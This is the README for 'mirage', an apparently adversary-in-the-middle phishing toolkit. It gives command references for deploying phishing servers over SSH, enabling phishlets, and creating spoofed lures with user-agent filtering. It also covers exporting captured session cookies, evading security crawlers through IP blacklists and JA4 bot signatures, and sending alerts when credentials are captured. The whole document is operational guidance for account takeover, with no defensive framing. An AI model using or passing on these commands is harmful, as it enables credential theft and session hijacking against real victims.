# mirage

The Mirage CLI client. Connects to one or more `miraged` instances over mutual TLS to manage phishlets, lures, sessions, and bot signatures.

## Usage

```txt
mirage [--server <alias>] [--config <path>] [--json] [<command>]
```

Running with no subcommand drops into the interactive REPL.

### Global flags

| Flag | Default | Description |
|------|---------|-------------|
| `--server` | default server from client config | Server alias to target |
| `--config` | `~/.mirage/client.json` | Path to the client config file |
| `--json` | false | Output raw JSON instead of formatted tables |

## Commands

### `server` — Manage miraged servers

```bash
mirage server add --alias prod --address 1.2.3.4:443 \
  --secret-hostname api.phish.example.com --token <invite-token>
mirage server list
mirage server remove prod
mirage server default prod
```

### `deploy` — Provision a remote miraged instance over SSH

```bash
mirage deploy 203.0.113.5 \
  --domain phish.example.com \
  --ip 203.0.113.5 \
  --ssh-key ~/.ssh/id_ed25519 \
  [--alias prod] [--secret-hostname api.phish.example.com] [--force]
```

Uploads the `miraged` binary, writes the config, installs a systemd unit, starts the service, and waits for a health check. On success, the server is automatically added to the client config.

### `phishlets` — Manage phishlets

```bash
mirage phishlets list
mirage phishlets enable <name> --hostname <hostname> [--dns-provider <alias>]
mirage phishlets disable <name>
mirage phishlets hide <name>
mirage phishlets unhide <name>
```

### `lures` — Manage phishing lures

```bash
mirage lures list [--phishlet <name>]
mirage lures create <phishlet> [--path /p/<id>] [--redirect <url>] [--spoof <url>] [--ua-filter <regex>]
mirage lures update <id> [--redirect <url>] [--spoof <url>] [--ua-filter <regex>] [--og-title ...] [--og-desc ...] [--og-image ...]
mirage lures url <id> [key=value ...]
mirage lures pause <id> --duration <duration>   # e.g. 15m, 2h, 1d
mirage lures unpause <id>
mirage lures delete <id>
```

### `sessions` — Manage captured sessions

```bash
mirage sessions list [--phishlet <name>] [--completed] [--since 24h]
mirage sessions show <id>
mirage sessions export <id> [--out cookies.json]
mirage sessions delete <id>
mirage sessions stream          # SSE stream of live session events
```

### `blacklist` — Manage the IP blacklist

```bash
mirage blacklist list
mirage blacklist add <ip-or-cidr>
mirage blacklist remove <ip-or-cidr>
```

### `botguard` — Manage bot signatures

```bash
mirage botguard list
mirage botguard add <ja4-hash> [--description "Googlebot"]
mirage botguard remove <ja4-hash>
```

### `notify` — Manage notification channels

```bash
mirage notify list
mirage notify events
mirage notify add --type <webhook|slack> --url <url> [--auth-header "Bearer ..."] [--filter session.completed,session.creds_captured]
mirage notify remove <id>
mirage notify test <id>
```

## Client config

The client config is stored at `~/.mirage/client.json` and tracks server connections. Cert paths are populated automatically during enrollment via `server add --token`.

```json
{
  "default_server": "prod",
  "servers": [
    {
      "alias": "prod",
      "address": "1.2.3.4:443",
      "secret_hostname": "api.phish.example.com",
      "client_cert_path": "~/.mirage/prod.crt",
      "client_key_path": "~/.mirage/prod.key",
      "server_ca_cert": "~/.mirage/prod-ca.crt"
    }
  ]
}
```

## Interactive REPL

Running `mirage` with no subcommand (or `mirage repl`) opens an interactive prompt:

```txt
mirage [prod]> sessions list
mirage [prod]> lures create microsoft --redirect https://microsoft.com
mirage [prod]> sessions export abc123 --out cookies.json
```

Tab completion is available for commands and flags.
